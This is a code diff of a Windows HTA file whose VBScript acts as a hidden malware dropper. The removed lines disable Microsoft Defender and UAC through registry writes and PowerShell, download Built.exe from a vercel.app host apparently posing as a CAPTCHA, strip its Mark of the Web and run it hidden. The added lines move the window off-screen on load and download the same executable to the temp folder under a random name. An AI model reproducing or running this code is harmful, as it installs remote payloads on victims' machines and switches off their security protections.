@@ -1,63 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Silent Execution</title>
-    <hta:application 
-        id="silentApp"
-        border="none"
-        sysmenu="no"
-        caption="no"
-        maximizeButton="no"
-        minimizeButton="no"
-        showInTaskbar="no"
-        windowState="hidden"
-        scroll="no"
-    />
-</head>
-<body>
+    <title>Download File</title>
+    <HTA:APPLICATION 
+        ID="DownloadApp"
+        APPLICATIONNAME="FileDownloadApp"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        ICON="none"
+        INNERBORDER="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no" />
     <script language="VBScript">
-        ' Forcefully disable Microsoft Defender (via registry and PowerShell)
-        Set WshShell = CreateObject("WScript.Shell")
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
-        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True
+    Sub Window_onLoad
+        ' Resize the window and move it off-screen
+        Self.resizeTo 1, 1
+        Self.moveTo -32000, -32000
 
-        ' Forcefully disable UAC via registry
-        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"
-        
-        ' Create a VBScript to download and execute Built.exe silently
-        Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
-        Set objStream = CreateObject("ADODB.Stream")
-        
+        ' Create Shell object to interact with the operating system
+        Set objShell = CreateObject("WScript.Shell")
+
+        ' Get temp folder location
+        tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
+
         ' URL of the file to download
-        fileURL = "https://notafakecaptica2222.vercel.app/Built.exe"
-        
-        ' Path to save the file temporarily
-        tempFilePath = "C:\Users\Public\Built.exe"
-        
-        ' Download the file
-        objXMLHttp.open "GET", fileURL, False
-        objXMLHttp.send
-        If objXMLHttp.Status = 200 Then
-            objStream.Open
-            objStream.Write objXMLHttp.responseBody
-            objStream.SaveToFile tempFilePath, 2 ' 2 means overwrite the file if exists
-            objStream.Close
-        End If
-        
-        ' Unblock the file (remove Mark of the Web)
-        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Unblock-File -Path '" & tempFilePath & "'""", 0, True
-        
-        ' Run the downloaded EXE file silently
-        WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
-        
-        ' Re-enable Defender protection after execution
-        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $false""", 0, True
-        
-        ' Clean up registry keys to re-enable Defender and UAC
-        WshShell.RegDelete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware"
-        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 1, "REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 5, "REG_DWORD"
+        downloadUrl = "https://notafakecaptica2222.vercel.app/Built.exe"
+
+        ' Generate a random filename for the downloaded file
+        randomFileName = GenerateRandomFileName() & ".exe"
+        downloadedFile = tempFolder & "\" & randomFileName
+
+        ' Construct the PowerShell command to download the file
+        cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
+
+        ' Run the command in the background
+        objShell.Run "cmd.exe /c " & cmdCommand, 0, True
+    End Sub
+
+    Function GenerateRandomFileName()
+        Dim randomStr, i
+        randomStr = ""
+        For i = 1 To 10
+            randomStr = randomStr & Chr(Int(Rnd * 26) + 65) ' Random characters A-Z
+        Next
+        GenerateRandomFileName = randomStr
+    End Function
     </script>
+</head>
+<body onload="Window_onLoad">
 </body>
 </html>
